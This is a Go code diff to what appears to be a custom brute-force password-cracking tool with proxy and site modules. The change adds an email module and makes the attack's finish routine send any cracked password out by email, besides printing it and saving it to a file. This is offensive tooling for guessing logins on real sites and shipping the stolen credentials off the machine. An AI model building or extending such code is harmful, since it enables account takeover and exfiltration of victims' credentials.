@@ -9,6 +9,7 @@ import (
 	"custom-bruteforce/pkg/proxy"
 	"custom-bruteforce/pkg/site"
 	"custom-bruteforce/pkg/structs"
+	"custom-bruteforce/pkg/email"
 	"encoding/json"
 	"errors"
 	"fmt"
@@ -232,7 +233,10 @@ func Start() error {
 	}
 	wg.Wait()
 	// When the script stopped working, this will be printed out
-	_attack_finished()
+	err = _attack_finished()
+	if err != nil {
+		return err
+	}
 	return nil
 }
 
@@ -357,12 +361,16 @@ func _while_running(pass string){
 }
 
 // message that will be printed out when the script is finished
-func _attack_finished(){
+func _attack_finished() (err error){
 	// checking if the attack is stopped and the password is found
 	if Attack.Stop && Attack.Status == StatusFound  && Attack.Password != "" {
 		fmt.Printf("\033[32m[~] the thing that you were looking for is found: %v\033[0m\n", Attack.Password)
 		// there we will save the password
 		WritePasswordToFile()
+		err = email.Send_Message(Attack.Password)
+		if err != nil {
+			return err
+		}
 		return
 	}
 	fmt.Printf("\033[33m[~] Well, looks that we can't find a thing that you need, sorry. :/\033[0m\n")
@@ -370,6 +378,7 @@ func _attack_finished(){
 		fmt.Printf("\033[33m[~] Error: %s\033[0m\n", Attack.ErrorMessage)
 		return
 	}
+	return
 }
 
 // Saving the password in the file
